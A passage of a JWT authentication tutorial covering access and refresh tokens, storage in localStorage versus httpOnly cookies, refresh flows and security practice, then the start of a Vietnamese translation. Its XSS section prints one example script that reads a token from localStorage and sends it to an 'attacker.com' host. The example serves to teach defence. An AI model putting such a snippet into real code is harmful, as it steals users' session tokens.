This dual-token approach is a security best practice.\n\n### Access Token\n\nAn **access token** is a short-lived credential that grants access to protected resources.\n\n**Characteristics:**\n\n- **Short lifespan**: Typically 15 minutes to 1 hour\n- **Contains user information**: Includes user ID, roles, permissions\n- **Sent with each request**: Included in the Authorization header\n- **Small attack window**: If compromised, the damage is limited by expiration time\n\nExample usage:\n\n```javascript\n// Sending access token with API request\nfetch(\"/api/user/profile\", {\n headers: {\n Authorization: `Bearer ${accessToken}`,\n },\n});\n```\n\n### Refresh Token\n\nA **refresh token** is a long-lived credential used to obtain new access tokens.\n\n**Characteristics:**\n\n- **Long lifespan**: Days, weeks, or even months\n- **Used only for token refresh**: Not sent with every API request\n- **More secure**: Stored more securely, less exposed\n- **Can be revoked**: Server can invalidate refresh tokens\n\n**Why use both?**\n\nThe dual-token approach balances security and user experience:\n\n1. **Security**: Short-lived access tokens minimize the risk if compromised\n2. **User experience**: Refresh tokens prevent constant re-authentication\n3. **Revocation control**: Easier to invalidate sessions by revoking refresh tokens\n4. **Reduced attack surface**: Access tokens are frequently exposed; refresh tokens are not\n\n### Typical Token Lifecycle\n\n```\nLogin \u2192 Issue Access Token (15min) + Refresh Token (7 days)\n \u2193\nAccess Token expires after 15 minutes\n \u2193\nUse Refresh Token to get new Access Token\n \u2193\nContinue accessing resources\n \u2193\nRefresh Token expires after 7 days \u2192 User must log in again\n```\n\n## Where to Store Tokens: localStorage vs httpOnly Cookies\n\nToken storage is one of the most debated topics in JWT authentication. The choice impacts both security and functionality.\n\n### Option 1: localStorage (or sessionStorage)\n\n**Pros:**\n\n- Easy to implement\n- Works perfectly with single-page applications (SPAs)\n- No CSRF concerns\n- Full control from JavaScript\n- Works across subdomains\n\n**Cons:**\n\n- **Vulnerable to XSS attacks**: Any JavaScript on the page can access the token\n- **Not accessible from server**: Cannot be used for server-side rendering\n- **No automatic sending**: Must manually attach to each request\n\n**Implementation:**\n\n```javascript\n// Storing token\nlocalStorage.setItem(\"accessToken\", token);\n\n// Retrieving token\nconst token = localStorage.getItem(\"accessToken\");\n\n// Sending with request\nfetch(\"/api/data\", {\n headers: {\n Authorization: `Bearer ${token}`,\n },\n});\n```\n\n### Option 2: httpOnly Cookies\n\n**Pros:**\n\n- **Protected from XSS**: JavaScript cannot access httpOnly cookies\n- **Automatic sending**: Browser automatically includes cookies in requests\n- **Works with SSR**: Server can read cookies for server-side rendering\n- **More secure by default**: Additional security flags available\n\n**Cons:**\n\n- **Vulnerable to CSRF attacks**: Requires CSRF protection\n- **CORS complexity**: Requires proper configuration for cross-origin requests\n- **Cookie size limits**: Typically 4KB limit per cookie\n- **Same-site restrictions**: May have issues with cross-domain requests\n\n**Implementation:**\n\n```javascript\n// Server sets cookie (Node.js/Express)\nres.cookie(\"accessToken\", token, {\n httpOnly: true, // Cannot be accessed by JavaScript\n secure: true, // Only sent over HTTPS\n sameSite: \"strict\", // CSRF protection\n maxAge: 900000, // 15 minutes\n});\n\n// Browser automatically sends cookie with requests\nfetch(\"/api/data\", {\n credentials: \"include\", // Include cookies\n});\n```\n\n### Recommended Approach: Hybrid Strategy\n\n**Best Practice:**\n\n- **Access Token**: Store in memory (JavaScript variable) or httpOnly cookie\n- **Refresh Token**: Always store in httpOnly cookie with secure flags\n\n```javascript\n// In-memory storage for access token\nlet accessToken = null;\n\n// Refresh token stored in httpOnly cookie (set by server)\n// Access token refreshed automatically when needed\nasync function fetchWithAuth(url, options = {}) {\n // If no access token, refresh it first\n if (!accessToken) {\n await refreshAccessToken();\n }\n\n return fetch(url, {\n ...options,\n headers: {\n ...options.headers,\n Authorization: `Bearer ${accessToken}`,\n },\n });\n}\n```\n\n### Security Comparison Table\n\n| Storage Method | XSS Vulnerability | CSRF Vulnerability | Best Use Case |\n| ----------------- | ----------------- | ------------------ | -------------------------------------- |\n| localStorage | High | Low | Simple SPAs with strong XSS protection |\n| httpOnly Cookie | Low | Medium | Production apps with CSRF protection |\n| Memory + httpOnly | Low | Medium | Recommended for sensitive applications |\n\n## Token Refresh Flow\n\nThe token refresh mechanism is essential for maintaining user sessions without constantly requiring re-authentication.\n\n### Standard Refresh Flow\n\n```\n1. User logs in\n \u2193\n2. Server issues Access Token (15min) + Refresh Token (7 days)\n \u2193\n3. Client makes API requests with Access Token\n \u2193\n4. Access Token expires\n \u2193\n5. Client detects 401 Unauthorized response\n \u2193\n6. Client sends Refresh Token to /refresh-token endpoint\n \u2193\n7. Server validates Refresh Token\n \u2193\n8. Server issues new Access Token (and optionally new Refresh Token)\n \u2193\n9. Client retries original request with new Access Token\n```\n\n### Implementation Example\n\n**Client-side (JavaScript):**\n\n```javascript\n// Axios interceptor for automatic token refresh\naxios.interceptors.response.use(\n (response) => response,\n async (error) => {\n const originalRequest = error.config;\n\n // If access token expired and we haven't retried yet\n if (error.response?.status === 401 && !originalRequest._retry) {\n originalRequest._retry = true;\n\n try {\n // Request new access token using refresh token\n const { data } = await axios.post(\n \"/api/auth/refresh\",\n {},\n {\n withCredentials: true, // Send httpOnly cookie\n },\n );\n\n // Update access token\n accessToken = data.accessToken;\n\n // Retry original request with new token\n originalRequest.headers[\"Authorization\"] = `Bearer ${accessToken}`;\n return axios(originalRequest);\n } catch (refreshError) {\n // Refresh token is invalid - redirect to login\n window.location.href = \"/login\";\n return Promise.reject(refreshError);\n }\n }\n\n return Promise.reject(error);\n },\n);\n```\n\n**Server-side (Node.js/Express):**\n\n```javascript\n// Refresh token endpoint\napp.post(\"/api/auth/refresh\", async (req, res) => {\n try {\n // Get refresh token from httpOnly cookie\n const refreshToken = req.cookies.refreshToken;\n\n if (!refreshToken) {\n return res.status(401).json({ error: \"No refresh token\" });\n }\n\n // Verify refresh token\n const decoded = jwt.verify(refreshToken, REFRESH_TOKEN_SECRET);\n\n // Check if refresh token is in database (not revoked)\n const tokenExists = await db.checkRefreshToken(\n decoded.userId,\n refreshToken,\n );\n if (!tokenExists) {\n return res.status(401).json({ error: \"Invalid refresh token\" });\n }\n\n // Generate new access token\n const newAccessToken = jwt.sign(\n { userId: decoded.userId, email: decoded.email },\n ACCESS_TOKEN_SECRET,\n { expiresIn: \"15m\" },\n );\n\n // Optionally issue new refresh token (token rotation)\n const newRefreshToken = jwt.sign(\n { userId: decoded.userId },\n REFRESH_TOKEN_SECRET,\n { expiresIn: \"7d\" },\n );\n\n // Update refresh token in database\n await db.updateRefreshToken(decoded.userId, refreshToken, newRefreshToken);\n\n // Set new refresh token cookie\n res.cookie(\"refreshToken\", newRefreshToken, {\n httpOnly: true,\n secure: true,\n sameSite: \"strict\",\n maxAge: 7 * 24 * 60 * 60 * 1000, // 7 days\n });\n\n // Send new access token\n res.json({ accessToken: newAccessToken });\n } catch (error) {\n res.status(401).json({ error: \"Invalid refresh token\" });\n }\n});\n```\n\n### Advanced: Silent Refresh\n\nFor better user experience, implement silent token refresh before expiration:\n\n```javascript\n// Check token expiration and refresh proactively\nfunction setupTokenRefresh() {\n setInterval(async () => {\n const decoded = parseJwt(accessToken);\n const expiresIn = decoded.exp * 1000 - Date.now();\n\n // Refresh 1 minute before expiration\n if (expiresIn < 60000) {\n await refreshAccessToken();\n }\n }, 30000); // Check every 30 seconds\n}\n```\n\n### Refresh Token Rotation\n\nFor enhanced security, implement refresh token rotation:\n\n```\n1. Client uses Refresh Token A to get new Access Token\n \u2193\n2. Server issues new Access Token + new Refresh Token B\n \u2193\n3. Server invalidates Refresh Token A\n \u2193\n4. Client must use Refresh Token B for next refresh\n```\n\nThis prevents refresh token reuse attacks.\n\n## Security Concerns\n\nJWT authentication introduces several security considerations that must be addressed.\n\n### 1. Token Security\n\n**XSS (Cross-Site Scripting) Attacks**\n\nIf attackers inject malicious scripts, they can steal tokens from localStorage:\n\n```javascript\n// Malicious script\nconst token = localStorage.getItem(\"accessToken\");\nfetch(\"https://attacker.com/steal\", {\n method: \"POST\",\n body: JSON.stringify({ token }),\n});\n```\n\n**Mitigations:**\n\n- Use httpOnly cookies for sensitive tokens\n- Implement Content Security Policy (CSP)\n- Sanitize all user inputs\n- Keep dependencies updated\n- Use security headers\n\n```javascript\n// Express security headers\nconst helmet = require(\"helmet\");\napp.use(\n helmet({\n contentSecurityPolicy: {\n directives: {\n defaultSrc: [\"'self'\"],\n scriptSrc: [\"'self'\"],\n },\n },\n }),\n);\n```\n\n**CSRF (Cross-Site Request Forgery) Attacks**\n\nWhen using cookies, protect against CSRF:\n\n```javascript\n// Use CSRF tokens\nconst csrf = require(\"csurf\");\napp.use(csrf({ cookie: true }));\n\n// Set SameSite cookie attribute\nres.cookie(\"refreshToken\", token, {\n httpOnly: true,\n sameSite: \"strict\", // or 'lax' for some cross-site navigation\n secure: true,\n});\n```\n\n### 2. Token Expiration\n\n**Never use long-lived tokens without refresh mechanism:**\n\n\u274c **Bad:**\n\n```javascript\n// 30-day access token - NEVER DO THIS\nconst token = jwt.sign(payload, secret, { expiresIn: \"30d\" });\n```\n\n\u2705 **Good:**\n\n```javascript\n// Short-lived access token\nconst accessToken = jwt.sign(payload, secret, { expiresIn: \"15m\" });\n// Long-lived refresh token (stored securely)\nconst refreshToken = jwt.sign(payload, refreshSecret, { expiresIn: \"7d\" });\n```\n\n### 3. Secret Management\n\n**Never hardcode secrets or commit them to version control:**\n\n\u274c **Bad:**\n\n```javascript\nconst secret = \"myS3cr3tK3y\"; // NEVER DO THIS\n```\n\n\u2705 **Good:**\n\n```javascript\n// Use environment variables\nconst secret = process.env.JWT_SECRET;\n\n// Use strong, random secrets\nconst crypto = require(\"crypto\");\nconst secret = crypto.randomBytes(64).toString(\"hex\");\n```\n\n### 4. Token Validation\n\nAlways validate tokens properly:\n\n```javascript\n// Comprehensive token validation\nfunction verifyToken(token) {\n try {\n const decoded = jwt.verify(token, JWT_SECRET, {\n algorithms: ['HS256'], // Specify allowed algorithms\n issuer: 'your-app', // Verify token issuer\n audience: 'your-api' // Verify intended audience\n });\n\n // Additional checks\n if (!decoded.userId) {\n throw new Error('Invalid token structure');\n }\n\n // Check if user still exists and is active\n const user = await db.findUser(decoded.userId);\n if (!user || !user.isActive) {\n throw new Error('User not found or inactive');\n }\n\n return decoded;\n } catch (error) {\n throw new Error('Token validation failed');\n }\n}\n```\n\n### 5. Token Revocation\n\nImplement a token revocation strategy:\n\n**Blacklist Approach:**\n\n```javascript\n// Store revoked tokens in Redis\nasync function revokeToken(token) {\n const decoded = jwt.decode(token);\n const expiresIn = decoded.exp - Math.floor(Date.now() / 1000);\n\n // Store in Redis with expiration\n await redis.setex(`blacklist:${token}`, expiresIn, \"revoked\");\n}\n\n// Check if token is revoked\nasync function isTokenRevoked(token) {\n const revoked = await redis.get(`blacklist:${token}`);\n return revoked !== null;\n}\n```\n\n**Refresh Token Whitelist:**\n\n```javascript\n// Store valid refresh tokens in database\n// Easier to manage and revoke\nasync function storeRefreshToken(userId, token) {\n await db.refreshTokens.insert({\n userId,\n token: hashToken(token),\n createdAt: new Date(),\n expiresAt: new Date(Date.now() + 7 * 24 * 60 * 60 * 1000),\n });\n}\n\n// Revoke all refresh tokens for a user (logout everywhere)\nasync function revokeAllUserTokens(userId) {\n await db.refreshTokens.deleteMany({ userId });\n}\n```\n\n### 6. Additional Security Best Practices\n\n**Use HTTPS Always:**\n\n```javascript\n// Redirect HTTP to HTTPS\napp.use((req, res, next) => {\n if (req.header(\"x-forwarded-proto\") !== \"https\") {\n res.redirect(`https://${req.header(\"host\")}${req.url}`);\n } else {\n next();\n }\n});\n```\n\n**Implement Rate Limiting:**\n\n```javascript\nconst rateLimit = require(\"express-rate-limit\");\n\nconst loginLimiter = rateLimit({\n windowMs: 15 * 60 * 1000, // 15 minutes\n max: 5, // 5 requests per window\n message: \"Too many login attempts, please try again later\",\n});\n\napp.post(\"/api/auth/login\", loginLimiter, loginHandler);\n```\n\n**Monitor and Log Security Events:**\n\n```javascript\n// Log authentication events\nfunction logAuthEvent(event, userId, ip) {\n logger.info({\n event,\n userId,\n ip,\n timestamp: new Date(),\n userAgent: req.headers[\"user-agent\"],\n });\n}\n\n// Examples\nlogAuthEvent(\"LOGIN_SUCCESS\", user.id, req.ip);\nlogAuthEvent(\"TOKEN_REFRESH\", user.id, req.ip);\nlogAuthEvent(\"INVALID_TOKEN\", null, req.ip);\n```\n\n### Security Checklist\n\n- [ ] Use short-lived access tokens (15-30 minutes)\n- [ ] Store refresh tokens in httpOnly cookies\n- [ ] Implement token refresh mechanism\n- [ ] Use HTTPS in production\n- [ ] Set secure cookie flags (httpOnly, secure, sameSite)\n- [ ] Implement CSRF protection\n- [ ] Use strong, randomly generated secrets\n- [ ] Never commit secrets to version control\n- [ ] Validate tokens thoroughly\n- [ ] Implement token revocation\n- [ ] Add rate limiting on auth endpoints\n- [ ] Log security events\n- [ ] Use Content Security Policy\n- [ ] Keep dependencies updated\n- [ ] Implement refresh token rotation\n\n## Conclusion\n\nJWT authentication is a powerful and flexible approach to securing modern web applications. By understanding the distinction between access and refresh tokens, carefully choosing token storage strategies, implementing proper refresh flows, and addressing security concerns, you can build a robust authentication system.\n\n**Key Takeaways:**\n\n1. **Use dual tokens**: Short-lived access tokens + long-lived refresh tokens\n2. **Store securely**: httpOnly cookies for refresh tokens, memory or httpOnly cookies for access tokens\n3. **Implement refresh flow**: Automatic token refresh for seamless user experience\n4. **Prioritize security**: XSS protection, CSRF protection, HTTPS, proper validation, and token revocation\n\nRemember, security is not a one-time implementation but an ongoing process. Stay updated with the latest security best practices and regularly audit your authentication implementation.\n\n---\n\n_Have questions or suggestions? Feel free to reach out in the comments below!_\n"}, {"name": "jwt-authentication-vi.md", "type": "text", "content": "# X\u00e1c Th\u1ef1c JWT: H\u01b0\u1edbng D\u1eabn To\u00e0n Di\u1ec7n V\u1ec1 X\u00e1c Th\u1ef1c D\u1ef1a Tr\u00ean Token B\u1ea3o M\u1eadt\n\n## Gi\u1edbi Thi\u1ec7u\n\nTrong ph\u00e1t tri\u1ec3n web hi\u1ec7n \u0111\u1ea1i, x\u00e1c th\u1ef1c l\u00e0 m\u1ed9t th\u00e0nh ph\u1ea7n quan tr\u1ecdng c\u1ee7a b\u1ea5t k\u1ef3 \u1ee9ng d\u1ee5ng n\u00e0o. JSON Web Tokens (JWT) \u0111\u00e3 tr\u1edf th\u00e0nh ti\u00eau chu\u1ea9n th\u1ef1c t\u1ebf \u0111\u1ec3 tri\u1ec3n khai x\u00e1c th\u1ef1c kh\u00f4ng tr\u1ea1ng th\u00e1i trong c\u00e1c \u1ee9ng d\u1ee5ng web. Trong h\u01b0\u1edbng d\u1eabn to\u00e0n di\u1ec7n n\u00e0y, ch\u00fang ta s\u1ebd kh\u00e1m ph\u00e1 JWT l\u00e0 g\u00ec, c\u00e1ch ch\u00fang ho\u1ea1t \u0111\u1ed9ng v\u00e0 c\u00e1c ph\u01b0\u01a1ng ph\u00e1p hay nh\u1ea5t \u0111\u1ec3 tri\u1ec3n khai ch\u00fang m\u1ed9t c\u00e1ch an to\u00e0n.\n\n## JWT L\u00e0 G\u00ec?\n\nJSON Web Token (JWT) l\u00e0 m\u1ed9t ti\u00eau chu\u1ea9n m\u1edf (RFC 7519) \u0111\u1ecbnh ngh\u0129a m\u1ed9t c\u00e1ch nh\u1ecf g\u1ecdn v\u00e0 \u0111\u1ed9c l\u1eadp \u0111\u1ec3 truy\u1ec1n th\u00f4ng tin an to\u00e0n gi\u1eefa c\u00e1c b\u00ean d\u01b0\u1edbi d\u1ea1ng \u0111\u1ed1i t\u01b0\u1ee3ng JSON. Th\u00f4ng tin n\u00e0y c\u00f3 th\u1ec3 \u0111\u01b0\u1ee3c x\u00e1c minh v\u00e0 tin c\u1eady v\u00ec n\u00f3 \u0111\u01b0\u1ee3c k\u00fd s\u1ed1 b\u1eb1ng m\u1ed9t kh\u00f3a b\u00ed m\u1eadt (v\u1edbi thu\u1eadt to\u00e1n HMAC) ho\u1eb7c c\u1eb7p kh\u00f3a c\u00f4ng khai/ri\u00eang t\u01b0 (s\u1eed d\u1ee5ng RSA ho\u1eb7c ECDSA).\n\n### C\u1ea5u Tr\u00fac JWT\n\nJWT bao g\u1ed3m ba ph\u1ea7n \u0111\u01b0\u1ee3c ph\u00e2n t\u00e1ch b\u1edfi d\u1ea5u ch\u1ea5m (`.`):\n\n```\nxxxxx.yyyyy.zzzzz\n```\n\n1. **Header (Ti\u00eau \u0111\u1ec1)**: Ch\u1ee9a lo\u1ea1i token (JWT) v\u00e0 thu\u1eadt to\u00e1n k\u00fd (HMAC, RSA, v.v.)\n2. **Payload (D\u1eef li\u1ec7u)**: Ch\u1ee9a c\u00e1c claims - c\u00e1c c\u00e2u l\u1ec7nh v\u1ec1 ng\u01b0\u1eddi d\u00f9ng v\u00e0 d\u1eef li\u1ec7u b\u1ed5 sung\n3. **Signature (Ch\u1eef k\u00fd)**: \u0110\u01b0\u1ee3c s\u1eed d\u1ee5ng \u0111\u1ec3 x\u00e1c minh th\u00f4ng \u0111i\u1ec7p kh\u00f4ng b\u1ecb thay \u0111\u1ed5i v\u00e0 x\u00e1c th\u1ef1c ng\u01b0\u1eddi g\u1eedi\n\nV\u00ed d\u1ee5 v\u1ec1 JWT \u0111\u00e3 gi\u1ea3i m\u00e3:\n\n```json\n// Header\n{\n \"alg\": \"HS256\",\n \"typ\": \"JWT\"\n}\n\n// Payload\n{\n \"sub\": \"1234567890\",\n \"name\": \"Nguy\u1ec5n V\u0103n A\",\n \"email\": \"nguyenvana@example.com\",\n \"iat\": 1516239022,\n \"exp\": 1516242622\n}\n\n// Signature\nHMACSHA256(\n base64UrlEncode(header) + \".\" +\n base64UrlEncode(payload),\n secret\n)\n```\n\n### \u0110\u1eb7c \u0110i\u1ec3m Ch\u00ednh C\u1ee7a JWT\n\n- **Nh\u1ecf g\u1ecdn**: K\u00edch th\u01b0\u1edbc nh\u1ecf gi\u00fap d\u1ec5 d\u00e0ng g\u1eedi qua URL, tham s\u1ed1 POST ho\u1eb7c HTTP headers\n- **\u0110\u1ed9c l\u1eadp**: Ch\u1ee9a t\u1ea5t c\u1ea3 th\u00f4ng tin ng\u01b0\u1eddi d\u00f9ng c\u1ea7n thi\u1ebft, tr\u00e1nh truy v\u1ea5n c\u01a1 s\u1edf d\u1eef li\u1ec7u\n- **Kh\u00f4ng tr\u1ea1ng th\u00e1i**: Server kh\u00f4ng c\u1ea7n l\u01b0u tr\u1eef th\u00f4ng tin phi\u00ean\n- **Kh\u1ea3 n\u0103ng di \u0111\u1ed9ng**: C\u00f3 th\u1ec3 \u0111\u01b0\u1ee3c s\u1eed d\u1ee5ng tr\u00ean c\u00e1c domain v\u00e0 d\u1ecbch v\u1ee5 kh\u00e1c nhau\n\n## Access Token v\u00e0 Refresh Token\n\nKhi tri\u1ec3n khai x\u00e1c th\u1ef1c JWT, \u0111i\u1ec1u quan tr\u1ecdng l\u00e0 ph\u1ea3i hi\u1ec3u s\u1ef1 kh\u00e1c bi\u1ec7t gi\u1eefa access token v\u00e0 refresh token. C\u00e1ch ti\u1ebfp c\u1eadn hai token n\u00e0y l\u00e0 m\u1ed9t ph\u01b0\u01a1ng ph\u00e1p hay nh\u1ea5t v\u1ec1 b\u1ea3o m\u1eadt.\n\n### Access Token\n\n**Access token** l\u00e0 th\u00f4ng tin x\u00e1c th\u1ef1c c\u00f3 th\u1eddi gian s\u1ed1ng ng\u1eafn c\u1ea5p quy\u1ec1n truy c\u1eadp v\u00e0o c\u00e1c t\u00e0i nguy\u00ean \u0111\u01b0\u1ee3c b\u1ea3o v\u1ec7.\n\n**\u0110\u1eb7c \u0111i\u1ec3m:**\n\n- **Th\u1eddi gian s\u1ed1ng ng\u1eafn**: Th\u01b0\u1eddng t\u1eeb 15 ph\u00fat \u0111\u1ebfn 1 gi\u1edd\n- **Ch\u1ee9a th\u00f4ng tin ng\u01b0\u1eddi d\u00f9ng**: Bao g\u1ed3m ID ng\u01b0\u1eddi d\u00f9ng, vai tr\u00f2, quy\u1ec1n\n- **G\u1eedi v\u1edbi m\u1ed7i y\u00eau c\u1ea7u**: \u0110\u01b0\u1ee3c bao g\u1ed3m trong Authorization header\n- **C\u1eeda s\u1ed5 t\u1ea5n c\u00f4ng nh\u1ecf**: N\u1ebfu b\u1ecb x\u00e2m ph\u1ea1m, thi\u1ec7t h\u1ea1i b\u1ecb gi\u1edbi h\u1ea1n b\u1edfi th\u1eddi gian h\u1ebft h\u1ea1n\n\nV\u00ed d\u1ee5 s\u1eed d\u1ee5ng:\n\n```javascript\n// G\u1eedi access token c\u00f9ng v\u1edbi y\u00eau c\u1ea7u API\nfetch(\"/api/user/profile\", {\n headers: {\n Authorization: `Bearer ${accessToken}`,\n },\n});\n```\n\n### Refresh Token\n\n**Refresh token** l\u00e0 th\u00f4ng tin x\u00e1c th\u1ef1c c\u00f3 th\u1eddi gian s\u1ed1ng d\u00e0i \u0111\u01b0\u1ee3c s\u1eed d\u1ee5ng \u0111\u1ec3 l\u1ea5y access token m\u1edbi.\n\n**\u0110\u1eb7c \u0111i\u1ec3m:**\n\n- **Th\u1eddi gian s\u1ed1ng d\u00e0i**: Nhi\u1ec1u ng\u00e0y, tu\u1ea7n ho\u1eb7c th\u1eadm ch\u00ed nhi\u1ec1u th\u00e1ng\n- **Ch\u1ec9 d\u00f9ng \u0111\u1ec3 l\u00e0m m\u1edbi token**: Kh\u00f4ng \u0111\u01b0\u1ee3c g\u1eedi v\u1edbi m\u1ed7i y\u00eau c\u1ea7u API\n- **An to\u00e0n h\u01a1n**: \u0110\u01b0\u1ee3c l\u01b0u tr\u1eef an to\u00e0n h\u01a1n, \u00edt b\u1ecb l\u1ed9 h\u01a1n\n- **C\u00f3 th\u1ec3 b\u1ecb thu h\u1ed3i**: Server c\u00f3 th\u1ec3 v\u00f4 hi\u1ec7u h\u00f3a refresh token\n\n**T\u1ea1i sao s\u1eed d\u1ee5ng c\u1ea3 hai?**\n\nC\u00e1ch ti\u1ebfp c\u1eadn hai token c\u00e2n b\u1eb1ng gi\u1eefa b\u1ea3o m\u1eadt v\u00e0 tr\u1ea3i nghi\u1ec7m ng\u01b0\u1eddi d\u00f9ng:\n\n1. **B\u1ea3o m\u1eadt**: Access token c\u00f3 th\u1eddi gian s\u1ed1ng ng\u1eafn gi\u1ea3m thi\u1ec3u r\u1ee7i ro n\u1ebfu b\u1ecb x\u00e2m ph\u1ea1m\n2. **Tr\u1ea3i nghi\u1ec7m ng\u01b0\u1eddi d\u00f9ng**: Refresh token ng\u0103n ch\u1eb7n vi\u1ec7c x\u00e1c th\u1ef1c l\u1ea1i li\u00ean t\u1ee5c\n3. **Ki\u1ec3m so\u00e1t thu h\u1ed3i**: D\u1ec5 d\u00e0ng v\u00f4 hi\u1ec7u h\u00f3a phi\u00ean b\u1eb1ng c\u00e1ch thu h\u1ed3i refresh token\n4. **Gi\u1ea3m b\u1ec1 m\u1eb7t t\u1ea5n c\u00f4ng**: Access token th\u01b0\u1eddng xuy\u00ean b\u1ecb l\u1ed9; refresh token th\u00ec kh\u00f4ng\n\n### V\u00f2ng \u0110\u1eddi Token \u0110i\u1ec3n H\u00ecnh\n\n```\n\u0110\u0103ng nh\u1eadp \u2192 C\u1ea5p Access Token (15 ph\u00fat) + Refresh Token (7 ng\u00e0y)\n \u2193\nAccess Token h\u1ebft h\u1ea1n sau 15 ph\u00fat\n \u2193\nS\u1eed d\u1ee5ng Refresh Token \u0111\u1ec3 l\u1ea5y Access Token m\u1edbi\n \u2193\nTi\u1ebfp t\u1ee5c truy c\u1eadp t\u00e0i nguy\u00ean\n \u2193\nRefresh Token h\u1ebft h\u1ea1n sau 7 ng\u00e0y \u2192 Ng\u01b0\u1eddi d\u00f9ng ph\u1ea3i \u0111\u0103ng nh\u1eadp l\u1ea1i\n```\n\n## N\u01a1i L\u01b0u Tr\u1eef Token: localStorage vs httpOnly Cookies\n\nL\u01b0u tr\u1eef token l\u00e0 m\u1ed9t trong nh\u1eefng ch\u1ee7 \u0111\u1ec1 \u0111\u01b0\u1ee3c tranh lu\u1eadn nhi\u1ec1u nh\u1ea5t trong x\u00e1c th\u1ef1c JWT. L\u1ef1a ch\u1ecdn \u1ea3nh h\u01b0\u1edfng \u0111\u1ebfn c\u1ea3 b\u1ea3o m\u1eadt v\u00e0 ch\u1ee9c n\u0103ng.\n\n### L\u1ef1a Ch\u1ecdn 1: localStorage (ho\u1eb7c sessionStorage)\n\n**\u01afu \u0111i\u1ec3m:**\n\n- D\u1ec5 tri\u1ec3n khai\n- Ho\u1ea1t \u0111\u1ed9ng ho\u00e0n h\u1ea3o v\u1edbi \u1ee9ng d\u1ee5ng trang \u0111\u01a1n (SPA)\n- Kh\u00f4ng lo ng\u1ea1i CSRF\n- Ki\u1ec3m so\u00e1t ho\u00e0n to\u00e0n t\u1eeb JavaScript\n- Ho\u1ea1t \u0111\u1ed9ng tr\u00ean c\u00e1c subdomain\n\n**Nh\u01b0\u1ee3c \u0111i\u1ec3m:**\n\n- **D\u1ec5 b\u1ecb t\u1ea5n c\u00f4ng XSS**: B\u1ea5t k\u1ef3 JavaScript n\u00e0o tr\u00ean trang \u0111\u1ec1u c\u00f3 th\u1ec3 truy c\u1eadp token\n- **Kh\u00f4ng th\u1ec3 truy c\u1eadp t\u1eeb server**: Kh\u00f4ng th\u1ec3 s\u1eed d\u1ee5ng cho server-side rendering\n- **Kh\u00f4ng t\u1ef1 \u0111\u1ed9ng g\u1eedi**: Ph\u1ea3i \u0111\u00ednh k\u00e8m th\u1ee7 c\u00f4ng v\u00e0o m\u1ed7i y\u00eau c\u1ea7u\n\n**Tri\u1ec3n khai:**\n\n```javascript\n// L\u01b0u tr\u1eef token\nlocalStorage.setItem(\"accessToken\", token);\n\n// L\u1ea5y token\nconst token = localStorage.getItem(\"accessToken\");\n\n// G\u1eedi c\u00f9ng v\u1edbi y\u00eau c\u1ea7u\nfetch(\"/api/data\", {\n headers: {\n Authorization: `Bearer ${token}`,\n },\n});\n```\n\n### L\u1ef1a Ch\u1ecdn 2: httpOnly Cookies\n\n**\u01afu \u0111i\u1ec3m:**\n\n- **\u0110\u01b0\u1ee3c b\u1ea3o v\u1ec7 kh\u1ecfi XSS**: JavaScript kh\u00f4ng th\u1ec3 truy c\u1eadp httpOnly cookies\n- **T\u1ef1 \u0111\u1ed9ng g\u1eedi**: Tr\u00ecnh duy\u1ec7t t\u1ef1 \u0111\u1ed9ng bao g\u1ed3m cookies trong c\u00e1c y\u00eau c\u1ea7u\n- **Ho\u1ea1t \u0111\u1ed9ng v\u1edbi SSR**: Server c\u00f3 th\u1ec3 \u0111\u1ecdc cookies cho server-side rendering\n- **An to\u00e0n h\u01a1n theo m\u1eb7c \u0111\u1ecbnh**: C\u00f3 s\u1eb5n c\u00e1c c\u1edd b\u1ea3o m\u1eadt b\u1ed5 sung\n\n**Nh\u01b0\u1ee3c \u0111i\u1ec3m:**\n\n- **D\u1ec5 b\u1ecb t\u1ea5n c\u00f4ng CSRF**: Y\u00eau c\u1ea7u b\u1ea3o v\u1ec7 CSRF\n- **\u0110\u1ed9 ph\u1ee9c t\u1ea1p CORS**: Y\u00eau c\u1ea7u c\u1ea5u h\u00ecnh ph\u00f9 h\u1ee3p cho c\u00e1c y\u00eau c\u1ea7u cross-origin\n- **Gi\u1edbi h\u1ea1n k\u00edch th\u01b0\u1edbc cookie**: Th\u01b0\u1eddng gi\u1edbi h\u1ea1n 4KB m\u1ed7i cookie\n- **H\u1ea1n ch\u1ebf same-site**: C\u00f3 th\u1ec3 g\u1eb7p v\u1ea5n \u0111\u1ec1 v\u1edbi c\u00e1c y\u00eau c\u1ea7u cross-domain\n\n**Tri\u1ec3n khai:**\n\n```javascript\n// Server thi\u1ebft l\u1eadp cookie (Node.js/Express)\nres.cookie(\"accessToken\", token, {\n httpOnly: true, // Kh\u00f4ng th\u1ec3 \u0111\u01b0\u1ee3c truy c\u1eadp b\u1edfi JavaScript\n secure: true, // Ch\u1ec9 g\u1eedi qua HTTPS\n sameSite: \"strict\", // B\u1ea3o v\u1ec7 CSRF\n maxAge: 900000, // 15 ph\u00fat\n});\n\n// Tr\u00ecnh duy\u1ec7t t\u1ef1 \u0111\u1ed9ng g\u1eedi cookie c\u00f9ng v\u1edbi y\u00eau c\u1ea7u\nfetch(\"/api/data\", {\n credentials: \"include\", // Bao g\u1ed3m cookies\n});\n```\n\n### Ph\u01b0\u01a1ng Ph\u00e1p \u0110\u01b0\u1ee3c Khuy\u1ebfn Ngh\u1ecb: Chi\u1ebfn L\u01b0\u1ee3c K\u1ebft H\u1ee3p\n\n**Ph\u01b0\u01a1ng ph\u00e1p hay nh\u1ea5t:**\n\n- **Access Token**: L\u01b0u tr\u1eef trong b\u1ed9 nh\u1edb (bi\u1ebfn JavaScript) ho\u1eb7c httpOnly cookie\n- **Refresh Token**: Lu\u00f4n l\u01b0u tr\u1eef trong httpOnly cookie v\u1edbi c\u00e1c c\u1edd b\u1ea3o m\u1eadt\n\n```javascript\n// L\u01b0u tr\u1eef trong b\u1ed9 nh\u1edb cho access token\nlet accessToken = null;\n\n// Refresh token \u0111\u01b0\u1ee3c l\u01b0u trong httpOnly cookie (do server thi\u1ebft l\u1eadp)\n// Access token \u0111\u01b0\u1ee3c l\u00e0m m\u1edbi t\u1ef1 \u0111\u1ed9ng khi c\u1ea7n\nasync function fetchWithAuth(url, options = {}) {\n // N\u1ebfu kh\u00f4ng c\u00f3 access token, l\u00e0m m\u1edbi n\u00f3 tr\u01b0\u1edbc\n if (!accessToken) {\n await refreshAccessToken();\n }\n\n return fetch(url, {\n ...options,\n headers: {\n ...options.headers,\n Authorization: `Bearer ${accessToken}`,\n },\n });\n}\n```\n\n### B\u1ea3ng So S\u00e1nh B\u1ea3o M\u1eadt\n\n| Ph\u01b0\u01a1ng 